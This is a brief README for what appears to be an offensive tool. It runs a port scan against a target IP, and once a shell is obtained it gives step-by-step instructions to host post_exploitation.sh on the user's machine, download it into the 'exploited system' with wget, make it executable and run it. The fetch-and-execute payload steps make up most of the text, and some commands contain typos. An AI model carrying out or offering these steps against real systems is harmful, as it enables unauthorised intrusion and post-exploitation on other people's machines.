# How to RUN the Project

RUN main.py on command line with a command as shown below:

To deploy this project run

```bash
  python main.py IP-Address --start-port 1 --end-port 40 
```
After the shell is opened follow these instructions

1-> Open a command terminal on your PC where the post_explotation.sh file is located and run 'pyhton -m http.server' to host the file

2-> Now on the shell run 'wget http://Your-IP-Address:8000/post_exploitation.sh', it will transfer the file in the exploited system

3-> Confirm that the file has been transferred using 'ls; command 

4-> Now run chmod +x post_exploitation

5-> Now run ./post_exploitation
```

and it will output the python vulnerabilities scripts.